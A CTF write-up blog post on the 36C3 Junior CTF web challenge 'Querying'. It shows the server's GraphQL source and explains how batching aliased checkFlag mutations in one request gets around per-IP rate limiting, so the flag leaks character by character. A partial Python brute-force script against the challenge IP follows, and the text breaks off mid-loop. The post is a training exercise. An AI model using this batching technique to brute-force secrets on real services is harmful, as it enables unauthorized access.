<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="36C3 Querying" /><meta name="author" content="Marius Kimmina" /><meta property="og:locale" content="en_US" /><meta name="description" content="0x0. Introduction This Challenge was part of the 36C3 Junior CTF. It was a “Web” challenge with a difficulty rating of “Medium”, you were given an URL for the live challenge server and also a copy of the server (with a fake flag obv) as a Docker Container to run locally to test your exploits. The local copy was needed because the real server would give you an timeout after every request to make bruteforcing the solution harder. Sadly I was not able to solve this challenge before the timeup to get some points for it but atleast I was able to complete it shortly afterwards for my own sake." /><meta property="og:description" content="0x0. Introduction This Challenge was part of the 36C3 Junior CTF. It was a “Web” challenge with a difficulty rating of “Medium”, you were given an URL for the live challenge server and also a copy of the server (with a fake flag obv) as a Docker Container to run locally to test your exploits. The local copy was needed because the real server would give you an timeout after every request to make bruteforcing the solution harder. Sadly I was not able to solve this challenge before the timeup to get some points for it but atleast I was able to complete it shortly afterwards for my own sake." /><link rel="canonical" href="https://mindslave.github.io/posts/36C3_Querying/" /><meta property="og:url" content="https://mindslave.github.io/posts/36C3_Querying/" /><meta property="og:site_name" content="Marius Kimmina" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-01-01T07:10:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="36C3 Querying" /><meta name="twitter:site" content="@Mindslave4" /><meta name="twitter:creator" content="@Marius Kimmina" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Marius Kimmina"},"description":"0x0. Introduction This Challenge was part of the 36C3 Junior CTF. It was a “Web” challenge with a difficulty rating of “Medium”, you were given an URL for the live challenge server and also a copy of the server (with a fake flag obv) as a Docker Container to run locally to test your exploits. The local copy was needed because the real server would give you an timeout after every request to make bruteforcing the solution harder. Sadly I was not able to solve this challenge before the timeup to get some points for it but atleast I was able to complete it shortly afterwards for my own sake.","headline":"36C3 Querying","url":"https://mindslave.github.io/posts/36C3_Querying/","@type":"BlogPosting","dateModified":"2021-04-17T14:04:16+02:00","datePublished":"2020-01-01T07:10:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mindslave.github.io/posts/36C3_Querying/"},"@context":"https://schema.org"}</script><title>36C3 Querying | Marius Kimmina</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-208027930-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-208027930-1'); }); </script> <script src="https://www.googleoptimize.com/optimize.js?id=OPT-K4ZZSSF"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/avatar/mk_avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marius Kimmina</a></div><div class="site-subtitle font-italic">IT-Security, Hacking and DevOps</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Mindslave" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Mindslave4" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/marius-kimmina-33a328201" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>36C3 Querying</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>36C3 Querying</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Marius Kimmina </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 1, 2020, 7:10 AM +0100" prep="on" > Jan 1, 2020 <i class="unloaded">2020-01-01T07:10:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 17, 2021, 9:04 PM +0900" prefix="Updated " > Apr 17 <i class="unloaded">2021-04-17T14:04:16+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1048 words">5 min</span></div></div><div class="post-content"><h3 id="0x0-introduction">0x0. Introduction</h3><p>This Challenge was part of the <em>36C3 Junior CTF</em>. It was a “Web” challenge with a difficulty rating of “Medium”, you were given an URL for the live challenge server and also a copy of the server (with a fake flag obv) as a Docker Container to run locally to test your exploits. The local copy was needed because the real server would give you an timeout after every request to make bruteforcing the solution harder. Sadly I was not able to solve this challenge before the timeup to get some points for it but atleast I was able to complete it shortly afterwards for my own sake.</p><h3 id="0x1-challenge-description">0x1. Challenge Description</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>In German, Graf means count. Anyway I'm certain he likes pie. Who doesn't? He also won't give you the Flag as he keeps track of every request. Nothing to see here, please move along. http://199.247.4.207:4000/
</pre></table></code></div></div><p>There was also a file for the local copy attached which looked like this:</p><p>.<br /> ├── dist.tar.gz<br /> ├── docker-compose.yml<br /> ├── Dockerfile<br /> ├── package.json<br /> ├── package-lock.json<br /> ├── prisma<br /> │   ├── datamodel.prisma<br /> │   ├── prisma.yml<br /> │   └── seed.graphql<br /> ├── src<br /> │   ├── generated<br /> │   │   └── prisma-client<br /> │   │   ├── index.d.ts<br /> │   │   ├── index.js<br /> │   │   └── prisma-schema.js<br /> │   ├── index.js<br /> │   └── schema.graphql<br /> └── yarn.lock</p><h3 id="0x2-looking-at-the-source-code">0x2. Looking at the source Code</h3><p>The most important file for this challenge was the index.js which contained the following code:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">GraphQLServer</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">graphql-yoga</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">LRU</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">lru-cache</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="p">{</span> <span class="nx">prisma</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./generated/prisma-client</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">MAX_WAIT</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1000</span> <span class="c1">// 10 seconds</span>

<span class="kd">const</span> <span class="nx">FLAG</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">junior-THIS_IS_A_DUMMY</span><span class="dl">"</span>
<span class="kd">const</span> <span class="nx">FLAG_REGEX</span> <span class="o">=</span> <span class="sr">/$junior-</span><span class="se">[</span><span class="sr">a-zA-Z0-9_</span><span class="se">]</span><span class="sr">24^/</span><span class="p">.</span><span class="nx">compile</span><span class="p">()</span>

<span class="kd">const</span> <span class="nx">requestsPerClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">LRU</span><span class="p">({</span>
  <span class="na">max</span><span class="p">:</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span>
  <span class="na">maxAge</span><span class="p">:</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">60</span>
<span class="p">})</span>

<span class="kd">function</span> <span class="nx">bruteforceProtection</span><span class="p">(</span><span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">ip</span> <span class="o">=</span> <span class="nx">context</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">ip</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">])</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">ip</span><span class="dl">"</span><span class="p">,</span> <span class="nx">ip</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">requests</span> <span class="o">=</span> <span class="nx">requestsPerClient</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span>
    <span class="kd">const</span> <span class="nx">waitTime</span> <span class="o">=</span> <span class="mi">15</span> <span class="o">*</span> <span class="nx">requests</span> <span class="o">*</span> <span class="mi">1000</span>
    <span class="nx">requestsPerClient</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">ip</span><span class="p">,</span> <span class="nx">requests</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span>
      <span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span>
        <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">finished</span><span class="dl">"</span><span class="p">,</span> <span class="nx">ip</span><span class="p">,</span> <span class="nx">waitTime</span><span class="p">)</span> <span class="o">||</span> <span class="nx">resolve</span><span class="p">()),</span> <span class="nx">waitTime</span>
      <span class="p">)</span>
    <span class="p">)</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">resolvers</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">Query</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">feed</span><span class="p">:</span> <span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">context</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">posts</span><span class="p">({</span> <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">published</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}</span> <span class="p">})</span>
    <span class="p">},</span>
    <span class="na">drafts</span><span class="p">:</span> <span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">context</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">posts</span><span class="p">({</span> <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">published</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}</span> <span class="p">})</span>
    <span class="p">},</span>
    <span class="na">post</span><span class="p">:</span> <span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="p">{</span> <span class="nx">id</span> <span class="p">},</span> <span class="nx">context</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">({</span> <span class="nx">id</span> <span class="p">})</span>
    <span class="p">},</span>
  <span class="p">},</span>
  <span class="na">Mutation</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">checkFlag</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="p">{</span><span class="nx">flag</span><span class="p">},</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">context</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">])</span> <span class="k">throw</span> <span class="dl">"</span><span class="s2">this got changed!</span><span class="dl">"</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">FLAG_REGEX</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">flag</span> <span class="o">===</span> <span class="nx">FLAG</span><span class="p">)</span> <span class="k">return</span> <span class="nx">FLAG</span><span class="p">.</span><span class="nx">length</span>
      <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="k">while</span> <span class="p">(</span><span class="nx">flag</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="nx">FLAG</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="nx">i</span><span class="o">++</span>
      <span class="k">return</span> <span class="nx">i</span>
    <span class="p">},</span>
    <span class="nx">createDraft</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="p">{</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">content</span> <span class="p">},</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">createPost</span><span class="p">({</span>
        <span class="nx">title</span><span class="p">,</span>
        <span class="nx">content</span><span class="p">,</span>
      <span class="p">})</span>
    <span class="p">},</span>
    <span class="nx">deletePost</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="p">{</span> <span class="nx">id</span> <span class="p">},</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">deletePost</span><span class="p">({</span> <span class="nx">id</span> <span class="p">})</span>
    <span class="p">},</span>
    <span class="nx">publish</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="p">{</span> <span class="nx">id</span> <span class="p">},</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">prisma</span><span class="p">.</span><span class="nx">updatePost</span><span class="p">({</span>
        <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="nx">id</span> <span class="p">},</span>
        <span class="na">data</span><span class="p">:</span> <span class="p">{</span> <span class="na">published</span><span class="p">:</span> <span class="kc">true</span> <span class="p">},</span>
      <span class="p">})</span>
    <span class="p">},</span>
  <span class="p">},</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GraphQLServer</span><span class="p">({</span>
  <span class="na">typeDefs</span><span class="p">:</span> <span class="dl">'</span><span class="s1">./src/schema.graphql</span><span class="dl">'</span><span class="p">,</span>
  <span class="nx">resolvers</span><span class="p">,</span>
  <span class="na">context</span><span class="p">:</span> <span class="k">async</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">fragmentReplacements</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">({</span>
    <span class="p">...</span><span class="nx">request</span><span class="p">,</span>
    <span class="nx">prisma</span><span class="p">,</span>
    <span class="na">console</span><span class="p">:</span> <span class="k">await</span> <span class="nx">bruteforceProtection</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span>
  <span class="p">}),</span>
<span class="p">})</span>

<span class="nx">server</span><span class="p">.</span><span class="nx">start</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Server is running on http://localhost:4000</span><span class="dl">'</span><span class="p">))</span>
</pre></table></code></div></div><p>From the “FLAG_REGEX” we know that the Flag consist of “Junior-“ and 24 Characters containing lowercase, uppercase, digits and underscores. We can use the “Check Flag” function which will tell us how many letters of our input match the actual Flag. So we could give the Webserver an Input like this:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nx">mutation</span> <span class="p">{</span> 
    <span class="nx">checkFlag</span><span class="p">(</span><span class="nx">flag</span><span class="p">:</span> <span class="dl">"</span><span class="s2">j</span><span class="dl">"</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The Server would then return “1”.<br /> This is somewhat screaming for a bruteforce, you can guess one letter at a time and as soon as the integer responds from the server increases you go for the next letter. But there is “BruteforceProtection” build into this which will give us an timeout after every request based on our IP. You could theoretically work around this protection by spoofing your IP after every request, which was some people acctaully did and I won’t blame them, whatever works works. But there is another more interesting solution which I want to focus on here.</p><h3 id="0x3-solution">0x3. Solution</h3><p>The catch is, in graphql you can provide multiple mutations at once. So it is possible to ask the Server for every possible character at a position in a single request. Such a request would look like this:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nx">mutation</span> <span class="p">{</span>
  <span class="nl">name1</span><span class="p">:</span> <span class="nx">checkFlag</span><span class="p">(</span><span class="nx">flag</span><span class="p">:</span> <span class="dl">"</span><span class="s2">junior-A</span><span class="dl">"</span><span class="p">),</span>
  <span class="nx">name2</span><span class="p">:</span> <span class="nx">checkFlag</span><span class="p">(</span><span class="nx">flag</span><span class="p">:</span> <span class="dl">"</span><span class="s2">junior-B</span><span class="dl">"</span><span class="p">),</span>
  <span class="p">...</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Since we need to get 24 characters with this approach we need 24 requests to the server to get the full Flag, which still took a bit but returned the flag in a somewhat reasonable amount of time. I came up with the following python Script to get the Flag:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">operator</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://199.247.4.207:4000/"</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"content-type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
    <span class="s">"admin"</span><span class="p">:</span> <span class="s">"true"</span>
<span class="p">}</span>

<span class="n">base_check</span> <span class="o">=</span> <span class="s">'checkFlag(flag: "junior-'</span>
<span class="n">name</span> <span class="o">=</span> <span class="s">"name"</span>
<span class="n">possible</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'a'</span><span class="p">,</span> <span class="s">'b'</span><span class="p">,</span> <span class="s">'c'</span><span class="p">,</span> <span class="s">'d'</span><span class="p">,</span> <span class="s">'e'</span><span class="p">,</span> <span class="s">'f'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'h'</span><span class="p">,</span> <span class="s">'i'</span><span class="p">,</span> <span class="s">'j'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'l'</span><span class="p">,</span> <span class="s">'m'</span><span class="p">,</span> <span class="s">'n'</span><span class="p">,</span> <span class="s">'o'</span><span class="p">,</span> <span class="s">'p'</span><span class="p">,</span> <span class="s">'q'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="s">'s'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'u'</span><span class="p">,</span> <span class="s">'v'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="s">'x'</span><span class="p">,</span> <span class="s">'y'</span><span class="p">,</span> <span class="s">'z'</span><span class="p">,</span> <span class="s">'A'</span><span class="p">,</span> <span class="s">'B'</span><span class="p">,</span> <span class="s">'C'</span><span class="p">,</span> <span class="s">'D'</span><span class="p">,</span> <span class="s">'E'</span><span class="p">,</span> <span class="s">'F'</span><span class="p">,</span> <span class="s">'G'</span><span class="p">,</span> <span class="s">'H'</span><span class="p">,</span> <span class="s">'I'</span><span class="p">,</span> <span class="s">'J'</span><span class="p">,</span> <span class="s">'K'</span><span class="p">,</span> <span class="s">'L'</span><span class="p">,</span> <span class="s">'M'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">,</span> <span class="s">'O'</span><span class="p">,</span> <span class="s">'P'</span><span class="p">,</span> <span class="s">'Q'</span><span class="p">,</span> <span class="s">'R'</span><span class="p">,</span> <span class="s">'S'</span><span class="p">,</span> <span class="s">'T'</span><span class="p">,</span> <span class="s">'U'</span><span class="p">,</span> <span class="s">'V'</span><span class="p">,</span> <span class="s">'W'</span><span class="p">,</span> <span class="s">'X'</span><span class="p">,</span> <span class="s">'Y'</span><span class="p">,</span> <span class="s">'Z'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">,</span> <span class="s">'5'</span><span class="p">,</span> <span class="s">'6'</span><span class="p">,</span> <span class="s">'7'</span><span class="p">,</span> <span class="s">'8'</span><span class="p">,</span> <span class="s">'9'</span><span class="p">,</span> <span class="s">'_'</span>
<span class="p">]</span>

<span class="n">start_query</span> <span class="o">=</span> <span class="s">"mutation {</span><span class="se">\n</span><span class="s">"</span>
<span class="n">end_query</span> <span class="o">=</span> <span class="s">"}"</span>
<span class="n">number</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">24</span><span class="p">):</span>
